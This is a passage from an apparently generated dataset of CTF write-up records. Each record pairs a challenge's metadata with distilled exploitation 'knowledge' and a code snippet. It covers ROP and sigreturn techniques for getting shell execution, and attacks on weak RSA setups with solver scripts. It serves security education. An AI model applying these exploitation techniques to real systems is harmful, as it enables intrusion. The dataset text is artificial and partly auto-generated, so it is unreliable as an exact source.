        "key": "```c\n// Generate a random block of +rwx memory that'll be filled randomly  \nuint32_t *random_code = mmap((void*)CODE_START, CODE_LENGTH,  \n                               PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);\n\n// Allocate memory for the user to send us a stack - it's just +rw  \nuint8_t  *stack = mmap((void*)STACK_START, STACK_LENGTH, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);\n\n...\n\n// Populate the random code block using a predictable RNG  \nint i;  \nsrand(t);  \nfor(i = 0; i < CODE_LENGTH / 4; i++) {  \n   random_code[i] = rand();  \n}\n\n// Finally the service reads `STACK_LENGTH` bytes of user input into the `stack`  \n// region, uses `asm(3)` to clear all of the registers, set the stack pointer  \n// (`esp`) to the `stack` memory region and immediately `ret`'s.\n```"
    },
    {
        "name": "ROPuzzle V1",
        "write_up": "dataset/raw/ROPuzzle V1.md",
        "type": "pwn",
        "competition": [
            "DigitalOverdose/2021",
            "https://ctftime.org/event/1459/tasks/"
        ],
        "score": 150,
        "max_score": 600,
        "difficulty": 0.25,
        "knowledge": [
            "For executing a syscall under restricted conditions where direct gadgets are not available, use a combination of ROP gadgets to manipulate the `RAX` register (or any other register as needed) to the required syscall number. This can often involve setting a value in `RAX` using one gadget, moving or modifying this value with other gadgets, and eventually getting to the desired syscall number.\n    - Example: To set `RAX` to 15 (`sigret` syscall number), chain gadgets to first move 6 into `RAX`, then use another gadget to store `RAX` value into `RDI`, set 9 into `RAX` with another gadget, and finally add `RDI` to `RAX`, resulting in `RAX` being 15. This sequence uses `mov`, `add`, and register transfer instructions.",
            "To bypass security mechanisms or restrictions, like a one-time execution due to a variable check, use a writable memory address that you can control as the stack. If that address is known and predictable (e.g., `.data` section), you can perform actions like overwriting a check-variable directly in memory, thereby resetting it as needed, or placing a payload in a position where its address is known and can be referenced in further exploits.\n    - Example: To bypass a one-shot execution check, first perform a `read` syscall directing input to a controlled stack location (e.g., `.data` section at `0x402000`), allowing overwriting of a variable or placing of shellcode/payload in a predictable memory location. Following this setup, execute the desired syscall (e.g., `execve`) with a ROP chain that sets the necessary registers (`RAX`, `RDI`, `RSI`, `RDX`) and points to the controlled stack location containing your payload or command to execute."
        ],
        "key": "```c\nvoid get_input() {\n    char buffer[8];\n    read(0, buffer, 0x1000);\n    if (*(int *)0x402000 != 0) {\n        exit(0);\n    }\n    *(int *)0x402000 = 1;\n    // Clear registers\n    asm(\"xor %eax, %eax\");\n    asm(\"xor %ebx, %ebx\");\n    asm(\"xor %ecx, %ecx\");\n    asm(\"xor %edx, %edx\");\n    asm(\"xor %esi, %esi\");\n    asm(\"xor %r8d, %r8d\");\n    asm(\"xor %r9d, %r9d\");\n    asm(\"xor %r10d, %r10d\");\n}\n```"
    },
    {
        "name": "ROR",
        "write_up": "dataset/raw/ROR.md",
        "type": "crypto",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 260,
        "max_score": 755,
        "difficulty": 0.3443708609271523,
        "knowledge": [
            "In cryptographic challenges where encryption involves modular arithmetic (like RSA) and the modulus N is known to be even, any encryption result retains the least significant bit (LSB) of its plaintext. This is due to the mathematical property that the remainder of division by any even number keeps the parity of the original number, meaning if the input is odd, the output remains odd, and likewise for even inputs. Therefore, if one has access to multiple encrypted outputs corresponding to shifted versions of the original plaintext, it's possible to extract the plaintext bits sequentially, particularly when the shifting is rightward and the LSB of each shifted version is leaked through the encryption.",
            "Based on the observation that rightward bit shifts and subsequent encryption of a message can leak the LSB of the message in each step when the modulus N is even, one can recover the entire plaintext message from a series of such encrypted outputs. This process involves collecting the LSB from each encrypted output, reversing the order of these bits (due to the rightward shifts), and then converting the binary string back into bytes to recover the original message. This method assumes that one has a sequence of encrypted values representing subsequent rightward shifts of a single message, making this technique specifically applicable to scenarios where shifting and encryption are used as described, and the modulus used in the encryption is known to be even.\n\nExample Python snippet for LSB recovery and plaintext reconstruction:\n```python\nlines = open(\"chall.txt\", 'r').readlines()\nbits = []\nfor line in lines:\n    v = int(line.strip())\n    bits.append(str(v & 1))\nbits = bits[::-1]  # Reverse the bits to match the original order\nplaintext = int(\"\".join(bits), 2).to_bytes(len(bits) // 8, byteorder='big')\nprint(plaintext)\n```\nThis snippet reads a sequence of encrypted integers from a file, extracts the LSB from each, reverses the bit sequence, and converts the binary string back into the original plaintext bytes."
        ],
        "key": "```python\nror = lambda x, l, b: (x >> l) | ((x & ((1<<l)-1)) << (b-l))\n\nN = 1  \nfor base in [2, 3, 7]:  \n   N *= pow(base, random.randint(123, 456))  \ne = random.randint(271828, 314159)\n\nm = int.from_bytes(flag, byteorder='big')  \nassert m.bit_length() < N.bit_length()\n\nfor i in range(m.bit_length()):  \n   print(pow(ror(m, i, m.bit_length()), e, N))  \n```"
    },
    {
        "name": "Routes Mark The Spot",
        "write_up": "dataset/raw/Routes Mark The Spot.md",
        "type": "The type of challenge in this write-up is **forensics**.",
        "competition": [
            "DanteCTF/2023",
            "https://ctftime.org/event/2000/tasks/"
        ],
        "score": 290,
        "max_score": 500,
        "difficulty": 0.58,
        "knowledge": [
            "When analyzing pcap files for hidden messages in CTF challenges, IPv6 packets might include encoded information within their hexdump patterns. Specifically, characters between specific delimiters (e.g., `:X:` where `X` represents a character) can be extracted to reveal part of a secret message or flag. This method relies on the uniqueness of IPv6 protocol used as a transmission medium for encoded data.",
            "If the extracted characters from such packets are not in the correct order, the IPv6 flow label field can potentially be used to reorder them. Sort the packets based on the ascending order of the binary flow label values. This sorting method implies that each packet's flow label value denotes its sequence in the overall message, enabling the reconstruction of the original message or flag when done correctly."
        ],
        "key": "```python\n# Possible vulnerable code snippet based on the context of packet analysis\n\nimport socket\n\ndef receive_packets():\n    # Create a raw socket to capture packets\n    s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    while True:\n        packet, addr = s.recvfrom(65535)\n        # Process the packet\n        process_packet(packet)\n\ndef process_packet(packet):\n    # Extract the flow label and data from the packet\n    flow_label = extract_flow_label(packet)\n    data = extract_data(packet)\n    # Check for the pattern ':X:'\n    if ':X:' in data:\n        # Extract the character between ':X:'\n        char = data.split(':')[1]\n        print(f\"Extracted character: {char}\")\n\ndef extract_flow_label(packet):\n    # Dummy function to extract flow label\n    return packet[1:5]\n\ndef extract_data(packet):\n    # Dummy function to extract data\n    return packet[40:]\n\nreceive_packets()\n```\n"
    },
    {
        "name": "rrop",
        "write_up": "dataset/raw/rrop.md",
        "type": "pwn",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 479,
        "max_score": 499,
        "difficulty": 0.9599198396793587,
        "knowledge": [
            "In a challenge involving Return-Oriented Programming (ROP) with a buffer overflow vulnerability, Sigreturn-Oriented Programming (SROP) can be utilized to bypass restrictions and execute arbitrary code when system calls are needed but direct control over arguments in conventional ROP chains is difficult. This approach requires finding gadgets to set the `rax` register to the syscall number for `sigreturn` (which is 15 on x86_64 architectures) and to execute a syscall. A fake signal frame can then be constructed on the stack to control the flow of execution, including setting the necessary registers for subsequent syscalls (e.g., for `mprotect` to make memory executable). This technique is especially useful when direct execution of shellcode is not initially possible due to memory permissions.\n    - Example payload components: \n        - `mov_rax_15_ret` gadget to set `rax` to 15.\n        - `syscall_ret` gadget to trigger a syscall.\n        - A `SigreturnFrame` instance to construct the fake signal frame with desired register values.",
            "When preparing to exploit a buffer overflow to perform SROP, careful calculation of stack addresses and payload size is necessary to ensure the fake signal frame and any additional payloads (e.g., shellcode) are correctly positioned. This implies the necessity of leaking a stack address to accurately place the shellcode and the fake signal frame in the buffer. Additionally, an `mprotect` syscall can be invoked via SROP to change the memory permissions of the stack (or other regions) to executable (RWX), which enables the execution of shellcode placed in the stack. This technique requires aligning the address passed to `mprotect` to a page boundary (typically, by zeroing out the least significant 12 bits of the leaked stack address).\n    - Direct application: Use the leaked buffer address to align the target memory region for `mprotect`, set the permissions to RWX, and specify the correct return address to jump to the shellcode.\n        - Leaked address manipulation: `leak&~(0xfff)` to align the address.\n        - Setting `frame.rdi`, `frame.rsi`, and `frame.rdx` for `mprotect` syscall arguments within the fake signal frame."
        ],
        "key": "```c\nint __cdecl main(int argc, const char **argv, const char **envp)  \n{  \n char buf; // [rsp+0h] [rbp-D0h]\n\n nvm_init(*(_QWORD *)&argc, argv, envp);  \n nvm_timeout();  \n printf(  \n   \"Hello pwners, it's gr4n173 wired machine.\\n\"  \n   \"Can you change the behaviour of a process, if so then take my Buffer  @%p,\nfrom some part of my process.\\n\",  \n   &buf;;  \n read(0, &buf, 0x1388uLL);  \n return 0;  \n}  \n```"
    },
    {
        "name": "RSA - 1",
        "write_up": "dataset/raw/RSA - 1.md",
        "type": "crypto",
        "competition": [
            "DeconstruCT.F/2021",
            "https://ctftime.org/event/1453/tasks/"
        ],
        "score": 150,
        "max_score": 597,
        "difficulty": 0.25125628140703515,
        "knowledge": [
            "When dealing with RSA encryption challenges where the ciphertext (c), public key exponent (e), and modulus (n) are given, tools like RsaCtfTool can be utilized to perform various attacks and potentially decrypt the information without manually breaking down the RSA components. This approach is particularly useful when direct factorization of the modulus or direct decryption seems impractical due to the size of the numbers involved.",
            "The success of decryption using tools like RsaCtfTool often depends on the tool's ability to exploit weaknesses in the RSA setup, such as using known vulnerabilities like small prime numbers, common modulus attacks, or even trying known primes from past CTF challenges (pastctfprimes attack). This highlights the importance of ensuring secure RSA key generation practices, avoiding small or widely used prime numbers for the key components."
        ],
        "key": "```python\ndef encrypt_rsa(plaintext, e, n):\n    plaintext_int = int.from_bytes(plaintext.encode('utf-8'), byteorder='big')\n    ciphertext = pow(plaintext_int, e, n)\n    return ciphertext\n\n# Example usage\nplaintext = \"dsc{t00_much_m4th_8898}\"\ne = 71\nn = 23519325203263800569051788832344215043304346715918641803\nciphertext = encrypt_rsa(plaintext, e, n)\nprint(ciphertext)\n```"
    },
    {
        "name": "RSA - 2",
        "write_up": "dataset/raw/RSA - 2.md",
        "type": "crypto",
        "competition": [
            "DeconstruCT.F/2021",
            "https://ctftime.org/event/1453/tasks/"
        ],
        "score": 150,
        "max_score": 597,
        "difficulty": 0.25125628140703515,
        "knowledge": [
            "In RSA encryption challenges, when the public exponent \\(e\\) is significantly smaller than the modulus \\(n\\) and if \\(c = m^e \\mod n\\) is such that \\(m^e < n\\), the ciphertext \\(c\\) essentially equals \\(m^e\\) without reduction by \\(n\\). In these cases, the plaintext message \\(m\\) can be recovered by taking the \\(e\\)th root of the ciphertext \\(c\\). This method exploits the low exponent vulnerability in RSA encryption.  \nExample Python snippet to compute \\(m\\):  \n```python\nfrom decimal import Decimal, getcontext\ngetcontext().prec = 1024 # precision should be sufficiently high\nc = Decimal(ciphertext)  # ciphertext\ne = Decimal(exponent)    # public exponent, e.g., 3\nroot = pow(c, 1/e)       # Calculate the e-th root of c\nm_int = int(root)        # Convert to integer\n```",
            "Conversion of a large integer to its ASCII representation often requires transformation from integer to hexadecimal, and then decoding the hexadecimal string to ASCII. This step is essential for extracting human-readable text from decrypted RSA messages, which usually represent the plaintext message \\(m\\) in integer form.  \nExample Python snippet for conversion from integer \\(m\\) to ASCII:  \n```python\nm_hex = hex(m_int)[2:-1] # Remove '0x' at the start and 'L' at the end if present\nm_ascii = ''.join(chr(int(m_hex[i:i+2], 16)) for i in range(0, len(m_hex), 2)) # Hex to ASCII\nprint(m_ascii)\n```"
        ],
        "key": "```python\ne = 3\nc = 2780321436921227845269766067805604547641764672251687438825498122989499386967784164108893743279610287605669769995594639683212592165536863280639528420328182048065518360606262307313806591343147104009274770408926901136562839153074067955850912830877064811031354484452546219065027914838811744269912371819665118277221\nn = 23571113171923293137414347535961677173798389971011031071091131271311371391491511571631671731791811911931971992112232272292332392412512572632692712772812832933073113133173313373473493533593673733793833893974014094194214314334394434494574614634674794874914995035095215235415475575635695715775875935996016076136176196316416436476536596616736776836917017097197277337397437517577617697737877978098118218238278298398538578598638778818838879079119199299379419479539679719779839919971009101310191431936117404941729571877755575331917062752829306305198341421305376800954281557410379953262534149212590443063350628712530148541217933209759909975139820841212346188350112608680453894647472456216566674289561525527394398888860917887112180144144965154878409149321280697460295807024856510864232914981820173542223592901476958693572703687098161888680486757805443187028074386001621827485207065876653623459779938558845775617779542038109532989486603799040658192890612331485359615639748042902366550066934348195272617921683\n\nfrom decimal import *\n\nc = Decimal(c)\ne = Decimal(e)\n\ngetcontext().prec = 1024 # Set a big enough precision\nroot = pow(c, 1/e) # Calculate c^(1/e) = m^(e * 1/e) = m\nprint(root)\n\n# Decode with no padding\nm = hex(int(root))[2:-1] # Number to hex\nm = ''.join(chr(int(m[i:i+2], 16)) for i in range(0, len(m), 2)) # Hex to Ascii\nprint(m)\n```"
    },
    {
        "name": "RSA - 3",
        "write_up": "dataset/raw/RSA - 3.md",
        "type": "crypto",
        "competition": [
            "DeconstruCT.F/2021",
            "https://ctftime.org/event/1453/tasks/"
        ],
        "score": 250,
        "max_score": 597,
        "difficulty": 0.4187604690117253,
        "knowledge": [
            "In RSA encryption challenges, when given the public key parameters (n and e), if the exponent e is large and the public key n is a product of two large primes that are close together, Weiner's Attack might be applicable to find the private exponent d. This attack is efficient when d is small relative to the modulus n.",
            "Tools like https://www.dcode.fr/rsa-cipher or other RSA decryption tools can be used to easily calculate the private key exponent d by providing the public modulus n and the public exponent e. This method is particularly useful when manual calculation is infeasible due to the large size of n or e.\n\nKnowledge Example:\n\n- Given: Large public exponent (e) and modulus (n) as part of an RSA public key.\n- Application: Use Weiner's Attack through online tools for decrypting or finding the private exponent (d) in RSA encryption challenges.\n\n(Note: It is not feasible to generate a specific payload example for using Weiner's Attack as it involves complex mathematical computation that is typically executed by algorithms within cryptographic tools.)"
        ],
        "key": "```python\ndef rsa_encrypt(message, e, n):\n    return pow(message, e, n)\n\ndef rsa_decrypt(ciphertext, d, n):\n    return pow(ciphertext, d, n)\n\n# Vulnerable to Wiener's attack if d is small\nn = 64064959164923876064874945473407049985543119992992738119252749231253142464203647518777455475109972581684732621072998898066728303433300585291527582979430276357787634026869116095391514311111174206395195817672737320837240364944609979844601986221462845364070396665723029902932653368943452652854174197070747631242101084260912287849286644699582292473152660004035330616149016496957012948833038931711943984563035784805193474921164625068468842927905314268942153720078680937345365121129404384633019183060347129778296640500935382186867850407893387920482141216498339346081106433144352485571795405717793040441238659925857198439433\ne = 36222680858414256161375884602150640809062958718117141382923099494341733093172587117165920097285523276338274750598022486976083511178091392849986039384975758609343597548039166024042264614496506087597114091663955133779956176941325431822684716988128271384410010471755324833136859652978240297120618458534306923558546176110055737233883129780378153307730890915697357455996361736492022695824172516806204252765904924281272883818154621932085365817823019773860783687666788095035790491006333432295698178378520444810813882117817329847874531809530929345430796600870728736678389479159328119322587647856274762262358880664585675219093\nd = 6393313697836242618414301946448995659516429576261871356767102021920538052481829568588047189447471873340140537810769433878383029164089236876209147584435733\n\n# Example usage\nmessage = 42\nciphertext = rsa_encrypt(message, e, n)\ndecrypted_message = rsa_decrypt(ciphertext, d, n)\n```"
    },
    {
        "name": "RSA Frustration",
        "write_up": "dataset/raw/RSA Frustration.md",
        "type": "crypto",
        "competition": [
            "WolvCTF/2022",
            "https://ctftime.org/event/1612/tasks/"
        ],
        "score": 499,
        "max_score": 500,
        "difficulty": 0.998,
        "knowledge": [
            "When dealing with RSA encryption challenges where the encryption process is repeated multiple times with different primes that have specific properties (e.g., primes such that (p-1) is divisible by e^2), a strategic approach involves factoring the modulus N for each encryption instance. Using online tools like FactorDB to find prime factors of large numbers can significantly speed up this process. Once the primes are gathered, utilize the Chinese Remainder Theorem (CRT) alongside nth root extraction for decryption, iterating through possible roots to find the decryption that leads to a valid flag format.",
            "To enhance efficiency in decrypting RSA with multiple layers of encryption, consider employing a Depth First Search (DFS) algorithm that recurses through potential decryptions based on the depth of encryption. This method can be optimized by narrowing down the candidates for each decryption step based on the bit length of the ciphertext. Smaller sets of candidates can be selected for decryption trials by using criteria such as the minimal size of candidate decryptions for ciphertexts of varying bit lengths, thus reducing the computational load and time required to recover the original message."
        ],
        "key": "```python\nfrom Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes\n\ndef encrypt(numToEncrypt):  \n   def getPrimeCustom(bitLength, e):  \n       while True:  \n           i = getPrime(bitLength)  \n           if (i-1) % e**2 == 0:  \n               return i\n\n   global e  \n   global C  \n   bitLength = ((len(bin(numToEncrypt)) - 2) // 2) + 9  \n   e = 113  \n   p = getPrimeCustom(bitLength, e)  \n   q = getPrimeCustom(bitLength, e)  \n   N = p * q  \n   print(f\"N = {N}\")  \n   C = pow(numToEncrypt, e, N)  \n   return C\n\nmsg = b\"wsc{????????????????????}\"  \nnumToEncrypt = bytes_to_long(msg)\n\n# maybe if I keep encrypting it will fix itself???  \n# surely it won't make it worse  \nencryptedNum = encrypt(numToEncrypt)  \nfor x in range(26):  \n   encryptedNum = encrypt(encryptedNum)  \n  \nprint(f\"e = {e}\")  \nprint(f\"C = {C}\")  \n```"
    },
    {
        "name": "RSA Gone Wrong",
        "write_up": "dataset/raw/RSA Gone Wrong.md",
        "type": "crypto",
        "competition": [
            "RITSEC/2022",
            "https://ctftime.org/event/1558/tasks/"
        ],
        "score": 391,
        "max_score": 500,
        "difficulty": 0.782,
        "knowledge": [
            "When given `phi` in an RSA encryption challenge and needing to find `n`, use the totient to systematically search for prime candidates for `p` and `q`. This involves generating the set of prime factors of `phi`, iterating over possible combinations of these factors, and testing each combination to see if it leads to valid prime numbers for `p` and `q` by adding 1 to the product of a combination and checking if the result is prime. This method works under the condition that the prime factors of `phi` are available or can be determined.",
            "Decrypting an RSA-encrypted message without directly knowing `n` but having its totient `phi`, the exponent `e`, and the ciphertext `ct` is possible by finding `p` and `q` through the method described above, calculating `d` as the modular multiplicative inverse of `e` modulo `phi`, and then decrypting the ciphertext with \\(d\\) and \\(n = p \\cdot q\\). This decryption step is applicable when `p` and `q` have been identified as primes and their product forms a valid `n` for the RSA encryption."
        ],
        "key": "```python\nfrom Crypto.Util.number import isPrime, long_to_bytes  \nfrom itertools import combinations  \nfrom functools import reduce\n\nct = 5130304507191400783541763470501911789653240155919651463963836982020864332865905486625179455227840365092388092655014361291395402708694164414365418338035119409356897221074  \nphi = 1570359526390327795587604223560025824592946281228350983265345431626589603873455573705621383229629752655777215638492468516856414709455757436817470769139576283488712724422152  \ne = 65537\n\nfactors = [2, 2, 2, 39479325013, 119942438633, 2052446000113,\n10087727746606604573, 18499937136886921343, 64270985366629197191403244080553,\n1683899661896976563424853785914753429323534430179719034228218351391]\n\nfor n in range(1, len(factors)):  \n   comb = combinations(factors, n)  \n   for c in comb:  \n       prod = reduce(int.__mul__, c)  \n       if isPrime(prod+1) and isPrime(phi//prod+1):  \n           p = prod+1  \n           q = phi//(p-1) + 1  \n           d = pow(e, -1, phi)  \n           pt = pow(ct, d, p*q)  \n           m = long_to_bytes(pt)  \n           if b\"RITSEC\" in m:  \n               exit(m.decode())  \n```"
    },
    {
        "name": "RSA Interna Attacker",
        "write_up": "dataset/raw/RSA Interna Attacker.md",
        "type": "crypto",
        "competition": [
            "THCon/2021",
            "https://ctftime.org/event/1381/tasks/"
        ],
        "score": 206,
        "max_score": 500,
        "difficulty": 0.412,
        "knowledge": [
            "In an RSA challenge where two parties share the same modulus (n), but have different public exponents (e), an internal attacker with access to one party's private key (d) can decrypt messages intended for the other party. This is possible because the underlying primes (p, q) determining the modulus (n) are the same, and knowing one private key, the modulus, and the public key allows for the determination of the other private key.",
            "To derive the primes (p, q) from known public modulus (n), public exponent (e), and private exponent (d), one can use an algorithm based on the property that `kphi = d*e - 1` is a multiple of `phi(n)`. By finding an integer `a` such that `gcd(x - 1, n)` gives a non-trivial factor of `n` (where `x = pow(a, k, n)` for some `k`), one can factor `n` to find `p` and `q`. This method relies on the fact that for correctly chosen `a` and `k`, `x` will be a non-trivial square root of 1 modulo `n`, leading to the discovery of `p` and `q`.\n\nSample of derived factors extraction code:\n```python\nfrom math import gcd\n\nn = int(input(\"Enter the value of n: \"))\ne = int(input(\"Enter the value of e: \"))\nd = int(input(\"Enter the value of d: \"))\n\nkphi = d * e - 1\nt = kphi\n\nwhile t % 2 == 0:\n    t = divmod(t, 2)[0]\n\na = 2\nwhile a < 100:\n    k = t\n    while k < kphi:\n        x = pow(a, k, n)\n        if x != 1 and x != (n - 1) and pow(x, 2, n) == 1:\n            p = gcd(x - 1, n)\n            break\n        k = k * 2\n    a = a + 2\n\nq = n // p\nassert (p * q) == n\nprint('p = ', p)\nprint('q = ', q)\nprint('phi is ', (p - 1) * (q - 1))\n```"
        ],
        "key": "```python  \nfrom Crypto.Util.number import getPrime, inverse, bytes_to_long  \nimport random  \nfrom math import gcd\n\ndef init():  \n   p = getPrime(1024)  \n   q = getPrime(1024)  \n   return p, q\n\ndef new_user(p, q):  \n   phi = (p - 1) * (q - 1)  \n   while True:  \n       e = random.randint(2, 100000)  \n       if gcd(e, phi) == 1:  \n           break  \n   d = inverse(e, phi)  \n   return e, d\n\ndef encrypt(m, e, n):  \n   return pow(m, e, n)\n\np, q = init()  \nn = p * q  \ne_a, d_a = new_user(p, q)  \ne_b, d_b = new_user(p, q)\n\nFLAG = b\"THC2021{??????????????????????????????????????}\"\n\nc = encrypt(bytes_to_long(FLAG), e_b, n)\n\nprint(f\"The public modulus : {hex(n)}\")  \nprint(f\"Your key pair : ({hex(e_a)}, {hex(d_a)})\")  \nprint(f\"Your boss public key : {hex(e_b)}\")  \nprint(f\"Intercepted message : {hex(c)}\")\n```"
    },
    {
        "name": "RSA School 2nd Grade",
        "write_up": "dataset/raw/RSA School 2nd Grade.md",
        "type": "crypto",
        "competition": [
            "BlueHens/2023",
            "https://ctftime.org/event/2126/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When encountering RSA encryption in CTF challenges, if the modulus n is relatively small or standard, it's beneficial to use tools like http://factordb.com/ to find its prime factors (p and q). This strategy simplifies the decryption process since having prime factors allows for the calculation of the private key (d) using the totient function (phi), which is a prerequisite for decrypting the ciphertext.",
            "For decryption in RSA challenges, once the prime factors of n (p and q) are identified, calculate phi as (p - 1) * (q - 1), and then compute the private key d by finding the modular inverse of e mod phi. The plaintext message can then be decrypted from the ciphertext using d. This process utilizes the RSA decryption formula: m = c^d mod n, where m is the plaintext message, c is the ciphertext, and n is the modulus. Additionally, if the decrypted plaintext is in hexadecimal format, it needs to be converted to a readable string."
        ],
        "key": "```python\nfrom Crypto.Util.number import *  \nn=166045890368446099470756111654736772731460671003059151938763854196360081247044441029824134260263654537  \ne=65537  \nmsg=bytes_to_long(b'UDCTF{REDACTED}')  \nct=pow(msg,e,n)  \nprint(n)  \nprint(e)  \nprint(ct)  \n```"
    },
    {
        "name": "RSA-GCD 50",
        "write_up": "dataset/raw/RSA-GCD 50.md",
        "type": "crypto",
        "competition": [
            "0xL4ugh/2024",
            "https://ctftime.org/event/2216/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In RSA-based challenges, when given equations involving manipulated forms of the secret primes `p` and `q` (such as `$(p+5q)^{power_1}\\;(mod\\;n)$` and `$(2p-3q)^{power_2}\\;(mod\\;n)$`), the equations can be raised to each others' powers and simplified using the Binomial Theorem. Since most terms will include a factor of `n`, they can be eliminated modulo `n`, thereby simplifying the problem to finding a solution that only involves `p`, `q`, or both. This method leverages the fact that certain operations, when carefully chosen, can cancel out variables or factors in a way that preserves the relationship necessary for extracting the primes or their multiple.",
            "If information is missing or obfuscated, such as being provided a value that is the smallest prime number greater than the desired output instead of the output itself (e.g., given `eq1` instead of `out1`), brute-forcing within a reasonable range can be a viable strategy. This approach exploits the relative density of prime numbers within certain numerical ranges to iteratively adjust the missing value until the correct conditions are met. In RSA challenges, once a correct adjustment is made to recover the missing information, standard RSA decryption procedures (such as computing the private key `d` from `e`, `p`, and `q`) can be applied to decrypt the ciphertext.\n\nExample adjustment (simplified for clarity):\n```py\nfor i in range(10000):  \n   diff = abs(pow(eq1, power2, n)*x1 - x2)  \n   q = gcd(diff, n)  \n   if q > 1:  # Found a potential prime factor of n\n       break  \n   eq1 -= 1  # Adjust eq1 and check again\n```\n\nThis strategy demonstrates how understanding the properties of RSA encryption and prime numbers can lead to the development of effective problem-solving techniques even when direct paths to solutions are obfuscated or seemingly incomplete."
        ],
        "key": "```python\nimport math  \nfrom Crypto.Util.number import *  \nfrom secret import flag, p, q  \nfrom gmpy2 import next_prime  \n\nm = bytes_to_long(flag.encode())  \nn = p * q\n\npower1 = getPrime(128)  \npower2 = getPrime(128)  \nout1 = pow((p + 5 * q), power1, n)  \nout2 = pow((2 * p - 3 * q), power2, n)  \neq1 = next_prime(out1)\n\nc = pow(m, eq1, n)\n\nwith open('chall2.txt', 'w') as f:  \n    f.write(f\"power1={power1}\\npower2={power2}\\neq1={eq1}\\nout2={out2}\\nc={c}\\nn={n}\")  \n```"
    },
    {
        "name": "RSA",
        "write_up": "dataset/raw/RSA.md",
        "type": "crypto",
        "competition": [
            "0CTF/2019/Quals",
            "https://ctftime.org/event/736/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "For lattice-based attacks on RSA where multiple ciphertexts are present, if the same message is encrypted with different public keys (each having the same exponent e), one can employ the Chinese Remainder Theorem along with H\u00e5stad's broadcast attack for decryption. This method is effective when the exponent e is small and the same for all ciphertexts. The key insight is that when the same plaintext is encrypted under different moduli with the same small exponent, it is vulnerable because it does not sufficiently disguise the plaintext.",
            "When attempting to decrypt ciphertexts with known moduli and a common small exponent, using the Chinese Remainder Theorem to combine the equations and then extracting the e-th root of the result reveals the original message. This approach is based on the mathematical property that when e is small and the plaintext is the same across different ciphertexts, the e-th root of the combined solution corresponds to the plaintext. This operation implicitly relies on the fact that the plaintext raised to the power of e, modulo the combination of all moduli, will still equal the plaintext if the plaintext is much smaller than all the moduli."
        ],
        "key": "```python\ndef find_mult_inv(x, n):  \n   a = [0, 1]  \n   q = [None, None]  \n   r = [n, x]  \n   i = 1  \n  \n   while r[i] > 1:  \n       i += 1  \n       r.append(r[i - 2] % r[i - 1])  \n       q.append(r[i - 2] // r[i - 1])  \n       a.append((a[i-2] - q[i] * a[i - 1]) % n)  \n  \n   if r[i] == 1: return a[i]  \n   else: return None\n\ndef nth_root(x, n):  \n   upper_bound = 1  \n   while upper_bound ** n <= x:  \n       upper_bound *= 2  \n   lower_bound = upper_bound // 2  \n   while lower_bound < upper_bound:  \n       mid = (lower_bound + upper_bound) // 2  \n       mid_nth = mid ** n  \n       if lower_bound < mid and mid_nth < x:  \n           lower_bound = mid  \n       elif upper_bound > mid and mid_nth > x:  \n           upper_bound = mid  \n       else:  \n           return mid  \n   return mid + 1\n\ndef chinese_remainder_theorem(ct_list, mod_list):  \n   orig_msg = 0\n\n   for ct, mod in zip(ct_list, mod_list):  \n       rem_mod_list = mod_list.copy()  \n       rem_mod_list.remove(mod)  \n       mul_res = mul(rem_mod_list)  \n       orig_msg += (ct * mul_res * find_mult_inv(mul_res, mod))\n\n   return orig_msg % mul(mod_list)\n```"
    },
    {
        "name": "rsaos",
        "write_up": "dataset/raw/rsaos.md",
        "type": "crypto",
        "competition": [
            "BSidesSF/2019",
            "https://ctftime.org/event/753/tasks/"
        ],
        "score": 666,
        "max_score": 666,
        "difficulty": 1.0,
        "knowledge": [
            "When facing challenges involving RSA encryption and signatures, especially with custom hash functions like FoldHash, crafting legitimate signatures can be done by exploiting the multiplicative property of RSA. This approach requires factoring a known hash/foldhash of a command into smaller values that can fit into a valid CRC32 hash, crafting inputs whose CRC32 hashes are equal to these factors, obtaining their RSA signatures from the server, and multiplying these signatures modulo N to get the desired signature for the original command. This method works under the condition that the target hash (e.g., the foldhash of the command for which a signature is needed) can be factored into smaller values that are valid outputs of the CRC32 function.",
            "In scenarios where direct calculation or generation of a required hash or signature is infeasible due to restrictions (such as size limits of CRC32), utilizing external tools designed to manipulate or forcibly calculate specific hash values, such as CRC32, according to desired outputs can be instrumental. These tools can generate inputs or suffixes that adjust the original input to produce a predetermined hash value. An example is using such a tool to create messages that satisfy specific hash values, facilitating the exploitation of vulnerabilities or the bypassing of security mechanisms in cryptographic challenges. \n\nExample usage of tool to force CRC values: `https://www.nayuki.io/page/forcing-a-files-crc-to-any-value`, which helps in calculating padding or additional data that, when appended to a given input, results in a CRC32 hash of a specific value, allowing for crafted requests in cryptographic attacks."
        ],
        "key": "```python\ndef foldhash(data):\n    sha1 = hashlib.sha1(data).digest()\n    left = int.from_bytes(sha1[:10], 'big')\n    right = int.from_bytes(sha1[10:], 'big')\n    return left ^ right\n\ndef sign_unprivileged(command, D, N):\n    crc32_value = zlib.crc32(command.encode())\n    return pow(crc32_value, D, N)\n\ndef sign_privileged(command, D, N):\n    hash_value = foldhash(command.encode())\n    return pow(hash_value, D, N)\n```"
    },
    {
        "name": "RSAphantine",
        "write_up": "dataset/raw/RSAphantine.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 142,
        "max_score": 477,
        "difficulty": 0.2976939203354298,
        "knowledge": [
            "When solving challenges involving Diophantine equations for RSA parameters, one can derive new equations from the given set by calculating the difference or sum of the given equations to simplify and isolate variables. This allows for easier factorization or identification of relationships between the variables, aiding in deciphering the unknowns required for decrypting the RSA message.",
